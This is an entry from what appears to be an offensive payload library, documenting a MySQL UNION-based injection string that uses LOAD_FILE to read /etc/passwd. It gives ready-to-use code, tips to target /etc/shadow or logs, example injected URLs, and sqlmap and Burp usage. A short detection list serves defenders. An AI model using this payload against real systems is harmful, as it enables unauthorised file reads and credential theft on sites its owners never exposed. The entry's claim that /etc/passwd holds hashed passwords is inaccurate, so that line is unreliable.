---
id: 3ec8598e-f8cf-4eec-b47d-7dc6cb2dd944
name: mysql-injection-payload-load-file-passwd
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.767491+00:00'
updated_at: '2023-04-10T20:22:51.271599+00:00'
platforms:
  - Linux
  - Web
tags:
  - mysql-injection
  - file-read
  - payload
validated: true
---

# mysql-injection-payload-load-file-passwd

## Code

```sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```

## Description

This SQL injection payload exploits a UNION-based vulnerability to execute LOAD_FILE and retrieve the contents of /etc/passwd, which contains user account information including hashed passwords. It appends to a legitimate query, using ' to close strings and -- to comment out trailing SQL.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| '/etc/passwd' | Path to the target file; adjust for other files like /etc/shadow | '/var/log/apache2/access.log' |

## Usage

Inject into a vulnerable parameter, e.g., GET /page.php?id=1' UNION ALL SELECT LOAD_FILE('/etc/passwd') --. Use in tools like Burp Repeater or sqlmap (--file-read=/etc/passwd). Requires matching column count in UNION (add NULLs if needed: SELECT NULL, LOAD_FILE(...)).

## Detection

- MySQL query logs showing LOAD_FILE with system paths.
- Application logs with UNION SELECT anomalies or file path strings.
- WAF alerts on keywords like LOAD_FILE, UNION ALL, or /etc/passwd.
- Increased query execution time or errors from privilege checks.

## Related

- [[procedures/mysql-file-content-extraction-via-injection]]
- [[commands/mysql-select-load-file]]
